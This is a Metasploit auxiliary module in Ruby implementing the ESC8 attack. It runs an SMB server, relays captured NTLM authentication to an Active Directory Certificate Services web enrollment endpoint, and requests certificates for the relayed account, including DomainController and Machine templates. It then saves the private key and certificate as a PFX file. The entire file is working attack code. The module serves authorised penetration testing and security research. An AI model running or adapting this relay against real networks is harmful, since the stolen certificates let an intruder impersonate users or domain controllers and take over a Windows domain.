##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include ::Msf::Exploit::Remote::SMB::RelayServer
  include ::Msf::Exploit::Remote::HttpClient

  def initialize(_info = {})
    super({
      'Name' => 'ESC8 Relay: SMB to HTTP(S)',
      'Description' => %q{
        This module creates an SMB server and then relays the credentials passed to it
        to an HTTP server to gain an authenticated connection.  Once that connection is
        established, the module makes an authenticated request for a certificate based
        on a given template.
      },
      'Author' => [
        'bwatters-r7',
        'jhicks-r7', # query for available certs
        'Spencer McIntyre'
      ],
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Relay', { 'Description' => 'Run SMB ESC8 relay server' } ]],
      'PassiveActions' => [ 'Relay' ],
      'DefaultAction' => 'Relay'
    })

    register_options(
      [
        OptEnum.new('MODE', [ true, 'The issue mode.', 'AUTO', %w[ALL AUTO QUERY_ONLY SPECIFIC_TEMPLATE]]),
        OptString.new('CERT_TEMPLATE', [ false, 'The template to issue if MODE is SPECIFIC_TEMPLATE.' ], conditions: %w[MODE == SPECIFIC_TEMPLATE]),
        OptString.new('TARGETURI', [ true, 'The URI for the cert server.', '/certsrv/' ])
      ]
    )

    register_advanced_options(
      [
        OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true]),
      ]
    )
  end

  def relay_targets
    Msf::Exploit::Remote::SMB::Relay::TargetList.new(
      (datastore['SSL'] ? :https : :http),
      datastore['RPORT'],
      datastore['RHOSTS'],
      datastore['TARGETURI'],
      randomize_targets: datastore['RANDOMIZE_TARGETS']
    )
  end

  def check_host(target_ip)
    res = send_request_raw(
      {
        'rhost' => target_ip,
        'method' => 'GET',
        'uri' => normalize_uri(target_uri),
        'headers' => {
          'Accept-Encoding' => 'identity'
        }
      }
    )
    disconnect

    return Exploit::CheckCode::Unknown if res.nil?
    unless res.code == 401
      return Exploit::CheckCode::Safe('The target does not require authentication.')
    end

    unless res.headers['WWW-Authenticate'].include?('NTLM') && res.body.present?
      return Exploit::CheckCode::Safe('The target does not support NTLM.')
    end

    if datastore['SSL']
      # if the target is over SSL, downgrade to "Detected" because Extended Protection for Authentication may or may not be enabled
      Exploit::CheckCode::Detected('Server replied that authentication is required and NTLM is supported. Target is over SSL, Extended Protection for Authentication (EPA) may or may not be enabled.')
    else
      Exploit::CheckCode::Appears('Server replied that authentication is required and NTLM is supported.')
    end
  end

  def validate
    super

    case datastore['MODE']
    when 'SPECIFIC_TEMPLATE'
      if datastore['CERT_TEMPLATE'].blank?
        raise Msf::OptionValidateError.new({ 'CERT_TEMPLATE' => 'CERT_TEMPLATE must be set when MODE is SPECIFIC_TEMPLATE' })
      end
    when 'ALL', 'AUTO', 'QUERY_ONLY'
      unless datastore['CERT_TEMPLATE'].nil? || datastore['CERT_TEMPLATE'].blank?
        print_warning('CERT_TEMPLATE is ignored in ALL, AUTO, and QUERY_ONLY modes.')
      end
    end
  end

  def run
    @issued_certs = {}
    relay_targets.each do |target|
      vprint_status("Checking endpoint on #{target}")
      check_code = check_host(target.ip)
      if [Exploit::CheckCode::Unknown, Exploit::CheckCode::Safe].include?(check_code)
        fail_with(Failure::UnexpectedReply, "Web Enrollment does not appear to be enabled on #{target}")
      end
    end

    start_service
    print_status('Server started.')

    # Wait on the service to stop
    service.wait if service
  end

  def on_relay_success(relay_connection:, relay_identity:)
    case datastore['MODE']
    when 'AUTO'
      cert_template = relay_identity.end_with?('$') ? ['DomainController', 'Machine'] : ['User']
      retrieve_certs(relay_connection, relay_identity, cert_template)
    when 'ALL', 'QUERY_ONLY'
      cert_templates = get_cert_templates(relay_connection)
      unless cert_templates.nil? || cert_templates.empty?
        print_status('***Templates with CT_FLAG_MACHINE_TYPE set like Machine and DomainController will not display as available, even if they are.***')
        print_good("Available Certificates for #{relay_identity} on #{datastore['RELAY_TARGET']}: #{cert_templates.join(', ')}")
        if datastore['MODE'] == 'ALL'
          retrieve_certs(relay_connection, relay_identity, cert_templates)
        end
      end
    when 'SPECIFIC_TEMPLATE'
      cert_template = datastore['CERT_TEMPLATE']
      retrieve_cert(relay_connection, relay_identity, cert_template)
    end

    vprint_status('Relay tasks complete; waiting for next login attempt.')
    relay_connection.disconnect!
  end

  def create_csr(private_key, cert_template)
    vprint_status('Generating CSR...')
    request = Rex::Proto::X509::Request.create_csr(private_key, cert_template)
    vprint_status('CSR Generated')
    request
  end

  def get_cert_templates(relay_connection)
    print_status('Retrieving available template list, this may take a few minutes')
    res = send_request_raw(
      {
        'client' => relay_connection,
        'method' => 'GET',
        'uri' => normalize_uri(target_uri, 'certrqxt.asp')
      }
    )
    return nil unless res&.code == 200

    cert_templates = res.body.scan(/^.*Option Value="[E|O];(.*?);/).map(&:first)
    print_bad('Found no available certificate templates') if cert_templates.empty?
    cert_templates
  end

  def add_cert_entry(relay_identity, cert_template)
    if @issued_certs.key?(relay_identity)
      @issued_certs[relay_identity] << cert_template
    else
      @issued_certs[relay_identity] = [ cert_template ]
    end
  end

  def retrieve_certs(relay_connection, relay_identity, cert_templates)
    cert_templates.each do |cert_template|
      retrieve_cert(relay_connection, relay_identity, cert_template)
    end
  end

  def cert_issued?(relay_identity, cert_template)
    !!@issued_certs[relay_identity]&.include?(cert_template)
  end

  def retrieve_cert(relay_connection, relay_identity, cert_template)
    if cert_issued?(relay_identity, cert_template)
      print_status("Certificate already created for #{relay_identity} using #{cert_template}, skipping...")
      return nil
    end

    vprint_status("Creating certificate request for #{relay_identity} using the #{cert_template} template")
    private_key = OpenSSL::PKey::RSA.new(4096)
    request = create_csr(private_key, cert_template)
    cert_template_string = "CertificateTemplate:#{cert_template}"
    vprint_status('Requesting relay target generate certificate...')
    res = send_request_raw(
      {
        'client' => relay_connection,
        'method' => 'POST',
        'uri' => normalize_uri(datastore['TARGETURI'], 'certfnsh.asp'),
        'ctype' => 'application/x-www-form-urlencoded',
        'vars_post' => {
          'Mode' => 'newreq',
          'CertRequest' => request.to_s,
          'CertAttrib' => cert_template_string,
          'TargetStoreFlags' => 0,
          'SaveCert' => 'yes',
          'ThumbPrint' => ''
        },
        'cgi' => true
      }
    )
    if res&.code == 200 && !res.body.include?('request was denied')
      print_good("Certificate generated using template #{cert_template} and #{relay_identity}")
      add_cert_entry(relay_identity, cert_template)
    else
      print_bad("Certificate request denied using template #{cert_template} and #{relay_identity}")
      return nil
    end

    location_tag = res.body.match(/^.*location="(.*)"/)[1]
    location_uri = normalize_uri(target_uri, location_tag)
    vprint_status("Attempting to download the certificate from #{location_uri}")
    res = send_request_raw(
      {
        'client' => relay_connection,
        'method' => 'GET',
        'uri' => location_uri
      }
    )
    info = "#{relay_identity} Certificate"
    certificate = OpenSSL::X509::Certificate.new(res.body)
    pkcs12 = OpenSSL::PKCS12.create('', '', private_key, certificate)
    stored_path = store_loot('windows.ad.cs',
                             'application/x-pkcs12',
                             relay_connection.target.ip,
                             pkcs12.to_der,
                             'certificate.pfx',
                             info)
    print_good("Certificate for #{relay_identity} using template #{cert_template} saved to #{stored_path}")
    certificate
  end
end
